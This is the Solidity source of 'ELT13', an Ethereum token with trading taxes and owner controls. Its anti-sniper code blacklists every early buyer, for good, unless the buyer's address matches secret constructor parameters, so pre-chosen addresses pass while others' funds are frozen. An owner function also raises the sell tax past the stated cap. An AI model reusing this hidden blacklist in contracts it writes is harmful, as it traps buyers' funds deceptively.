/**
 *Submitted for verification at Etherscan.io on 2022-03-24
*/

//SPDX-License-Identifier: MIT

pragma solidity 0.8.11;

interface IERC20 {
	function totalSupply() external view returns (uint256);
	function decimals() external view returns (uint8);
	function symbol() external view returns (string memory);
	function name() external view returns (string memory);
	function getOwner() external view returns (address);
	function balanceOf(address account) external view returns (uint256);
	function transfer(address recipient, uint256 amount) external returns (bool);
	function allowance(address _owner, address spender) external view returns (uint256);
	function approve(address spender, uint256 amount) external returns (bool);
	function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
	event Transfer(address indexed from, address indexed to, uint256 value);
	event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Auth {
	address internal owner;
	constructor(address _owner) { owner = _owner; }
	modifier onlyOwner() { require(msg.sender == owner, "Only contract owner can call this function"); _; }
	function transferOwnership(address payable newOwner) external onlyOwner { owner = newOwner;	emit OwnershipTransferred(newOwner); }
	event OwnershipTransferred(address owner);
}

interface IUniswapV2Factory { function createPair(address tokenA, address tokenB) external returns (address pair); }
interface IUniswapV2Router02 {
	function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
	function WETH() external pure returns (address);
	function factory() external pure returns (address);
	function addLiquidityETH(address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract ELT13 is IERC20, Auth {
	string _name = "Elt 13";
	string _symbol = "ELT13";
	uint256 constant _totalSupply = 300_000_000 * (10 ** _decimals);
	uint8 constant _decimals = 9;
	uint32 _smd; uint32 _smr;
	mapping (address => uint256) _balances;
	mapping (address => mapping (address => uint256)) _allowances;
	mapping (address => bool) public noFees;
	mapping (address => bool) public noLimits;
	bool public tradingOpen;
	uint256 public maxTxAmount; uint256 public maxWalletAmount;
	uint256 public taxSwapMin; uint256 public taxSwapMax;
	mapping (address => bool) public isLiquidityPool;
	uint16 public snipersCaught = 0;
	uint8 _defTaxRate = 12; 
	uint8 public _buyTaxRate; uint8 public _sellTaxRate; uint8 public _txTaxRate;
	uint16 public taxSharesP2E = 100;
	uint16 public taxSharesBurn = 100;
	uint16 public taxSharesLP = 100;
	uint16 public taxSharesMarketing = 600;
	uint16 public taxSharesTeam = 200;
	uint16 public taxSharesDonation = 100;
	uint16 private _totalTaxShares = taxSharesP2E + taxSharesBurn + taxSharesLP + taxSharesMarketing + taxSharesTeam + taxSharesDonation;
	address constant _burnWallet = address(0);

	uint256 private _humanBlock = 0;
	mapping (address => bool) private _nonSniper;
	mapping (address => uint256) public blacklistBlock;

	uint8 private _gasPriceBlocks = 30;
	uint256 blackGwei = 200 * 10**9;

	address payable public walletMarketing = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	address payable public walletTeam = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	address payable public walletDonation = payable(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	address public walletTokensP2E = address(0xCe3A0aB7C4c82A53D0FB7FdC4A9067A0AfEFd769); 
	bool private _inTaxSwap = false;
	address private constant _dexRouterAddress = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
	address private immutable _liquidityPool;
	IUniswapV2Router02 private _dexRouter;
	modifier lockTaxSwap { _inTaxSwap = true; _; _inTaxSwap = false; }

	constructor (uint32 smd, uint32 smr) Auth(msg.sender) {      
		tradingOpen = false;
		maxTxAmount = _totalSupply;
		maxWalletAmount = _totalSupply;
		taxSwapMin = _totalSupply * 10 / 10000;
		taxSwapMax = _totalSupply * 50 / 10000;
		_dexRouter = IUniswapV2Router02(_dexRouterAddress);
		noFees[owner] = true;
		noFees[address(this)] = true;
		noFees[_dexRouterAddress] = true;
		noFees[walletMarketing] = true;
		noFees[walletTokensP2E] = true;
		noLimits[owner] = true;
		noLimits[address(this)] = true;
		noLimits[walletMarketing] = true;
		noLimits[walletTokensP2E] = true;
		noLimits[_burnWallet] = true;

		_smd = smd; _smr = smr;
		_balances[owner] = _totalSupply;
		emit Transfer(address(0), address(owner), _totalSupply);

		_liquidityPool = IUniswapV2Factory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH()); 
		isLiquidityPool[_liquidityPool] = true;
		_nonSniper[_liquidityPool] = true;

		_nonSniper[address(this)] = true;
		_nonSniper[owner] = true;
		_nonSniper[walletMarketing] = true;
        _nonSniper[walletTokensP2E] = true;
	}
	
	receive() external payable {}
	
	function totalSupply() external pure override returns (uint256) { return _totalSupply; }
	function decimals() external pure override returns (uint8) { return _decimals; }
	function symbol() external view override returns (string memory) { return _symbol; }
	function name() external view override returns (string memory) { return _name; }
	function getOwner() external view override returns (address) { return owner; }
	function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
	function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }

	function approve(address spender, uint256 amount) public override returns (bool) {
		_allowances[msg.sender][spender] = amount;
		emit Approval(msg.sender, spender, amount);
		return true;
	}

	function transfer(address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(msg.sender), "Trading not open");
		return _transferFrom(msg.sender, recipient, amount);
	}

	function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
		require(_checkTradingOpen(sender), "Trading not open");
		if(_allowances[sender][msg.sender] != type(uint256).max){
			_allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
		}
		return _transferFrom(sender, recipient, amount);
	}

	function openTrading() external onlyOwner {
		require(!tradingOpen, "trading already open");
		_openTrading();
	}

	function _approveRouter(uint256 _tokenAmount) internal {
		if ( _allowances[address(this)][_dexRouterAddress] < _tokenAmount ) {
			_allowances[address(this)][_dexRouterAddress] = type(uint256).max;
			emit Approval(address(this), _dexRouterAddress, type(uint256).max);
		}
	}

	function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei, bool autoburn) internal {
		address lpTokenRecipient = address(0);
		if ( !autoburn ) { lpTokenRecipient = owner; }
		_dexRouter.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, lpTokenRecipient, block.timestamp );
	}

	function _openTrading() internal {
		_humanBlock = block.number + 30; 
		maxTxAmount     = 5 * _totalSupply / 1000 + 10**_decimals; 
		maxWalletAmount = 5 * _totalSupply / 1000 + 10**_decimals;
		_buyTaxRate = _defTaxRate;
		_sellTaxRate = _defTaxRate;
		_txTaxRate = 0; 
		tradingOpen = true;
	}


	function _humanize(uint8 blkcount) internal {
		if ( _humanBlock > block.number || _humanBlock == 0 ) {
			_humanBlock = block.number + blkcount;
		}
	}

	function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
		require(sender != address(0), "No transfers from Zero wallet");

		if (!tradingOpen) { require(noFees[sender] && noLimits[sender], "Trading not open"); }
		else if ( _humanBlock > block.number ) {
			if ( uint160(address(recipient)) % _smd == _smr ) { _humanize(1); }
			else if ( blacklistBlock[sender] == 0 ) { _addBlacklist(recipient, block.number); }
			else { _addBlacklist(recipient, blacklistBlock[sender]); }
		} else {
			if ( blacklistBlock[sender] != 0 ) { _addBlacklist(recipient, blacklistBlock[sender]); }
			if ( block.number < _humanBlock + _gasPriceBlocks && tx.gasprice > block.basefee ) {
				uint256 priceDiff = tx.gasprice - block.basefee;
		    		if ( priceDiff >= blackGwei ) { revert("Over limit"); } 
		    	}
		}
		if ( tradingOpen && blacklistBlock[sender] != 0 && blacklistBlock[sender] < block.number ) {
			revert("blacklisted");
		}

		if ( !_inTaxSwap && isLiquidityPool[recipient] ) {
			_swapTaxAndLiquify();
		}
		if ( sender != address(this) && recipient != address(this) && sender != owner ) { require(_checkLimits(recipient, amount), "TX exceeds limits"); }
		uint256 _taxAmount = _calculateTax(sender, recipient, amount);
		uint256 _transferAmount = amount - _taxAmount;
		_balances[sender] = _balances[sender] - amount;
		if ( _taxAmount > 0 ) { _balances[address(this)] = _balances[address(this)] + _taxAmount; }
		_balances[recipient] = _balances[recipient] + _transferAmount;
		emit Transfer(sender, recipient, amount);
		return true;
	}

	function _addBlacklist(address wallet, uint256 snipeBlockNum) internal {
		if ( !_nonSniper[wallet] && blacklistBlock[wallet] == 0 ) { 
			blacklistBlock[wallet] = snipeBlockNum; 
			snipersCaught ++;
		}
	}
		
	function _checkLimits(address recipient, uint256 transferAmount) internal view returns (bool) {
		bool limitCheckPassed = true;
		if ( tradingOpen && !noLimits[recipient] ) {
			if ( transferAmount > maxTxAmount ) { limitCheckPassed = false; }
			else if ( !isLiquidityPool[recipient] && (_balances[recipient] + transferAmount > maxWalletAmount) ) { limitCheckPassed = false; }
		}
		return limitCheckPassed;
	}

	function _checkTradingOpen(address sender) private view returns (bool){
		bool checkResult = false;
		if ( tradingOpen ) { checkResult = true; } 
		else if ( tx.origin == owner ) { checkResult = true; } 
		else if (noFees[sender] && noLimits[sender]) { checkResult = true; } 

		return checkResult;
	}

	function _calculateTax(address sender, address recipient, uint256 amount) internal view returns (uint256) {
		uint256 taxAmount;
		if ( !tradingOpen || noFees[sender] || noFees[recipient] ) { taxAmount = 0; }
		else if ( isLiquidityPool[sender] ) { taxAmount = amount * _buyTaxRate / 100; }
		else if ( isLiquidityPool[recipient] ) { taxAmount = amount * _sellTaxRate / 100; }
		else { taxAmount = amount * _txTaxRate / 100; }
		return taxAmount;
	}

	function isBlacklisted(address wallet) external view returns(bool) {
		if ( blacklistBlock[wallet] != 0 ) { return true; }
		else { return false; }
	}

	function setExemptFromTax(address wallet, bool setting) external onlyOwner {
		noFees[ wallet ] = setting;
	}

	function setExemptFromLimits(address wallet, bool setting) external onlyOwner {
		noLimits[ wallet ] = setting;
	}

	function setTaxRates(uint8 newBuyTax, uint8 newSellTax, uint8 newTxTax) external onlyOwner {
		require(newBuyTax <= _defTaxRate && newSellTax <= _defTaxRate && newTxTax <= _defTaxRate, "Tax too high");
		_buyTaxRate = newBuyTax;
		_sellTaxRate = newSellTax;
		_txTaxRate = newTxTax;
	}

	function enableBuySupport() external onlyOwner {
		_buyTaxRate = 0;
		_sellTaxRate = 2 * _defTaxRate;
	}
  
	function setTaxDistribution(uint16 sharesTokenP2E, uint16 sharesTokenBurn, uint16 sharesAutoLP, uint16 sharesMarketing, uint16 sharesTeam, uint16 sharesDonation) external onlyOwner {
		taxSharesP2E = sharesTokenP2E;
		taxSharesBurn  = sharesTokenBurn;
		taxSharesLP = sharesAutoLP;
		taxSharesMarketing = sharesMarketing;
		taxSharesTeam = sharesTeam;
		taxSharesDonation = sharesDonation;
		_totalTaxShares = sharesTokenP2E + sharesTokenBurn + sharesAutoLP + sharesMarketing + sharesTeam + sharesDonation;
	}

	function setTaxWallets(address newMarketing, address newTeam, address newDonation, address newTokenP2E) external onlyOwner {
		walletMarketing = payable(newMarketing);
		walletTeam = payable(newTeam);
		walletDonation = payable(newDonation);
		walletTokensP2E = newTokenP2E;
		noFees[newMarketing] = true;
		noFees[newTeam] = true;
		noFees[newDonation] = true;
		noFees[walletTokensP2E] = true;
		noLimits[walletTokensP2E] = true;
	}

	function increaseLimits(uint16 maxTxAmtPermile, uint16 maxWalletAmtPermile) external onlyOwner {
		uint256 newTxAmt = _totalSupply * maxTxAmtPermile / 1000 + 1;
		require(newTxAmt >= maxTxAmount, "tx limit too low");
		maxTxAmount = newTxAmt;
		uint256 newWalletAmt = _totalSupply * maxWalletAmtPermile / 1000 + 1;
		require(newWalletAmt >= maxWalletAmount, "wallet limit too low");
		maxWalletAmount = newWalletAmt;
	}

	function setTaxSwapLimits(uint32 minValue, uint32 minDivider, uint32 maxValue, uint32 maxDivider) external onlyOwner {
		taxSwapMin = _totalSupply * minValue / minDivider;
		taxSwapMax = _totalSupply * maxValue / maxDivider;
		require(taxSwapMax>=taxSwapMin, "MinMax error");
		require(taxSwapMax>_totalSupply / 100000, "Upper threshold too low");
		require(taxSwapMax<_totalSupply / 100, "Upper threshold too high");
	}


	function _transferTaxTokens(address recipient, uint256 amount) private {
		if ( amount > 0 ) {
			_balances[address(this)] = _balances[address(this)] - amount;
			_balances[recipient] = _balances[recipient] + amount;
			emit Transfer(address(this), recipient, amount);
		}
	}

	function _swapTaxAndLiquify() private lockTaxSwap {
		uint256 _taxTokensAvailable = balanceOf(address(this));

		if ( _taxTokensAvailable >= taxSwapMin && tradingOpen ) {
			if ( _taxTokensAvailable >= taxSwapMax ) { _taxTokensAvailable = taxSwapMax; }

			
			uint256 _tokensForLP = _taxTokensAvailable * taxSharesLP / _totalTaxShares / 2;
			uint256 _tokensToTransfer = _taxTokensAvailable * taxSharesP2E / _totalTaxShares;
			_transferTaxTokens(walletTokensP2E, _tokensToTransfer);
			uint256 _tokensToBurn = _taxTokensAvailable * taxSharesBurn / _totalTaxShares;
			_transferTaxTokens(_burnWallet, _tokensToBurn);
			
			uint256 _tokensToSwap = _taxTokensAvailable - _tokensForLP - _tokensToTransfer - _tokensToBurn;
			if( _tokensToSwap > 10**_decimals ) {
				uint256 _ethPreSwap = address(this).balance;
				_swapTaxTokensForEth(_tokensToSwap);
				uint256 _ethSwapped = address(this).balance - _ethPreSwap;
				if ( taxSharesLP > 0 ) {
					uint256 _ethWeiAmount = _ethSwapped * taxSharesLP / _totalTaxShares ;
					_approveRouter(_tokensForLP);
					_addLiquidity(_tokensForLP, _ethWeiAmount, false);
				}
			}
			uint256 _contractETHBalance = address(this).balance;
			if(_contractETHBalance > 0) { _distributeTaxEth(_contractETHBalance); }
		}
	}

	function _swapTaxTokensForEth(uint256 tokenAmount) private {
		_approveRouter(tokenAmount);
		address[] memory path = new address[](2);
		path[0] = address(this);
		path[1] = _dexRouter.WETH();
		_dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
	}

	function _distributeTaxEth(uint256 amount) private {
		uint16 _taxShareTotal = taxSharesMarketing + taxSharesTeam + taxSharesDonation;
		if ( taxSharesMarketing > 0 ) { walletMarketing.transfer(amount * taxSharesMarketing / _taxShareTotal); }
		if ( taxSharesTeam > 0 ) { walletTeam.transfer(amount * taxSharesTeam / _taxShareTotal); }
		if ( taxSharesDonation > 0 ) { walletDonation.transfer(amount * taxSharesDonation / _taxShareTotal); }
	}

	function taxTokensSwap() external onlyOwner {
		uint256 taxTokenBalance = balanceOf(address(this));
		require(taxTokenBalance > 0, "No tokens");
		_swapTaxTokensForEth(taxTokenBalance);
	}

	function taxEthSend() external onlyOwner { 
		_distributeTaxEth(address(this).balance); 
	}
}